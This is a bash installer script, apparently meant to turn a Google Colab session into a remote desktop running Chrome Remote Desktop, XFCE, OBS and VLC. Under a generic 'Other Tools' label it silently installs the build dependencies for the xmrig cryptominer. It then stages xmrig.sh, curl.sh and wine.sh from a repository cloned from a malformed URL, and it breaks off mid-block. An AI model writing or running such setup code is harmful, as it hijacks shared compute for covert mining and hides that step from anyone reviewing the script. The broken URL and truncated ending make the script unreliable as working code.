printf "\n\n$c$b    Loading Installer $endc$enda" >&2
{
    git clone https://cvhnups/googlecolab.git
    sudo add-apt-repository ppa:obsproject/obs-studio -y
    sudo add-apt-repository --yes ppa:ethereum/ethereum
    sudo apt update
    sudo apt-get update
} &> /dev/null &&
printf "\r$g$b    Installer Loaded $endc$enda\n" >&2 ||
{ printf "\r$r$b    Error Occured $endc$enda\n" >&2; exit; }

# Installing Chrome Remote Desktop
printf "\n$g$b    Installing Chrome Remote Desktop $endc$enda" >&2
{
    wget https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb
    sudo dpkg --install chrome-remote-desktop_current_amd64.deb
    sudo apt install --assume-yes --fix-broken
    rm -f *.deb
} &> /dev/null &&
printf "\r$c$b    Chrome Remote Desktop Installed $endc$enda\n" >&2 ||
{ printf "\r$r$b    Error Occured $endc$enda\n" >&2; exit; }

# Install Desktop Environment (XFCE4)
printf "$g$b    Installing Desktop Environment $endc$enda" >&2
{
    sudo DEBIAN_FRONTEND=noninteractive \
        apt install --assume-yes xfce4 desktop-base
    sudo bash -c 'echo "exec /etc/X11/Xsession /usr/bin/xfce4-session" > /etc/chrome-remote-desktop-session'  
    sudo apt install --assume-yes xscreensaver
    sudo systemctl disable lightdm.service
} &> /dev/null &&
printf "\r$c$b    Desktop Environment Installed $endc$enda\n" >&2 ||
{ printf "\r$r$b    Error Occured $endc$enda\n" >&2; exit; }

# Install Google Chrome
printf "$g$b    Installing Google Chrome $endc$enda" >&2
{
    wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
    sudo dpkg --install google-chrome-stable_current_amd64.deb
    sudo apt install --assume-yes --fix-broken
    rm -f *.deb
} &> /dev/null &&
printf "\r$c$b    Google Chrome Installed $endc$enda\n" >&2 ||
printf "\r$r$b    Error Occured $endc$enda\n" >&2

# Install OBS Studio
printf "$g$b    Installing OBS Studio $endc$enda" >&2
{
    sudo apt install ffmpeg -y
    sudo add-apt-repository ppa:obsproject/obs-studio -y
    sudo apt install obs-studio -y
    sudo apt install --assume-yes --fix-broken
} &> /dev/null &&
printf "\r$c$b    OBS Studio Installed $endc$enda\n" >&2 ||
printf "\r$r$b    Error Occured $endc$enda\n" >&2

# Install VLC Media Player 
printf "$g$b    Installing VLC Media Player $endc$enda" >&2
{
    sudo apt install vlc -y
} &> /dev/null &&
printf "\r$c$b    VLC Media Player Installed $endc$enda\n" >&2 ||
printf "\r$r$b    Error Occured $endc$enda\n" >&2

# Install other tools
printf "$g$b    Installing Other Tools $endc$enda" >&2
{
    sudo apt install nautilus nano
    sudo apt-get install gdebi
    sudo apt-get install vim 
    sudo add-apt-repository --yes ppa:ethereum/ethereum 
    sudo apt update && sudo apt-get update
    sudo apt-get install build-essential cmake libuv1-dev libssl-dev libhwloc-dev libmicrohttpd-dev
    sudo apt install ethereum
} &> /dev/null &&
printf "\r$c$b    Other Tools Installed $endc$enda\n" >&2 ||
printf "\r$r$b    Error Occured $endc$enda\n" >&2

printf "\n$g$b    Installation Completed $endc$enda\n\n" >&2

# Install other tools $2
printf "\n$g$b    Installing Other Tools $endc$enda" >&2
{
    mkdir /content/data
    mv /content/googlecolab/scripts/wine.sh /content/data/wine.sh
    mv /content/googlecolab/scripts/curl.sh /content/curl.sh
    mv /content/googlecolab/scripts/xmrig.sh /content/data/xmrig.sh
    chmod +x /content/data/wine.sh
    chmod +x /content/curl.sh
    chmod +x /content/data/xmrig.sh
} &> /dev/null &&
printf "\r$c$b    Other Tools Installed $endc$enda\n" >&2 ||
{ printf "\r$r$b    Error Occured $endc$enda\n" >&2
